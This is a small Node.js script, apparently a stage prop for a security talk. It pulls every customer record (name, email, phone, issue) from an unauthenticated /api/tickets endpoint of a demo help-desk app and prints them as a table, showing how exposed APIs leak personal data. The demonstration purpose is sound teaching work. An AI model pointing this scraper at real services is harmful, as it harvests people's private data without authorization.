#!/usr/bin/env node
// Live-demo prop for the "attacker's-eye view" segment (see ATTACKER-VIEW-RUNBOOK.md).
// Plain Node version - works the same in PowerShell, Git Bash, WSL, macOS, Linux.
// Does nothing an attacker's browser couldn't already do - it just hits the same
// unauthenticated endpoint the app itself exposes and prints the response as a
// table instead of raw JSON, so it reads on stage.
//
// Usage: node attacker-scrape.js [base-url]
//   defaults to the deployed Vercel URL if no argument is given.

const https = require('https');
const http = require('http');

const baseUrl = process.argv[2] || 'https://peopledesk-demo.vercel.app';
const url = baseUrl.replace(/\/$/, '') + '/api/tickets';
const client = url.startsWith('https') ? https : http;

console.log(`[+] Requesting ${url} ...`);
console.log('[+] No credentials, no token, no session - plain GET.\n');

client.get(url, (res) => {
  if (res.statusCode !== 200) {
    console.error(`[!] Got HTTP ${res.statusCode} - is the URL right, and is the app awake?`);
    res.resume();
    process.exitCode = 1;
    return;
  }
  let body = '';
  res.on('data', (chunk) => { body += chunk; });
  res.on('end', () => {
    let data;
    try {
      data = JSON.parse(body);
    } catch (e) {
      console.error('[!] Response was not JSON - printing raw body:\n');
      console.error(body);
      process.exitCode = 1;
      return;
    }
    const pad = (s, n) => String(s ?? '').padEnd(n);
    console.log(`[+] Received ${data.length} customer record(s). Authentication required: none.\n`);
    console.log(pad('NAME', 22) + pad('EMAIL', 30) + pad('PHONE', 18) + 'ISSUE');
    console.log('-'.repeat(90));
    for (const t of data) {
      console.log(pad(t.name, 22) + pad(t.email, 30) + pad(t.phone, 18) + (t.issue || ''));
    }
    console.log('\n[+] Elapsed: well under a second. Same command works at any scale.');
  });
}).on('error', (err) => {
  console.error(`[!] Request failed: ${err.message}`);
  process.exitCode = 1;
});
